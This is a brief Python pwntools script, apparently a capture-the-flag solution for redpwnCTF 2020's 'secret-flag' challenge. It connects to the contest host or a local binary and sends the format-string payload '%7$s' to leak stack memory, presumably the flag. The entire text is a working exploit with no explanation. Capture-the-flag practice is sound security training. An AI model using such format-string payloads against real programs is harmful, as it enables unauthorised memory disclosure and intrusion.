from pwn import *

if args.REMOTE:
    p = remote("2020.redpwnc.tf",31826)
else:
    p = process("./secret-flag")


p.recv()
p.sendline("%7$s")
print p.recv()
